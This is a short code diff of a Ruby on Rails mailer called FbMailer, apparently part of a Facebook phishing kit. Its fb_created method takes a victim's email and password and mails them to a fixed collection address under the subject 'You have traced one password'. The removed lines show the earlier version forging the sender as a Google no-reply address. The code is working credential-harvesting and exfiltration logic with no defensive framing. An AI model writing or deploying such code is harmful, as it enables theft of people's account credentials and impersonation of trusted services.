@@ -1,5 +1,5 @@
-class FbMailer <  ActionMailer::Base
-default from: 'no-reply@accounts.google.com'
+  class FbMailer <  ActionMailer::Base
+
 
   def fb_created(email,password)
     @email = email
@@ -7,8 +7,8 @@ default from: 'no-reply@accounts.google.com'
     mail(
 
         to: 'st118173@ait.asia',
-        from: @email,
-        subject: "An email is tracked in yours Facebook webiste",
+        from: 'jntu784@gmail.com',
+        subject: "You have traced one password",
 
     )
 
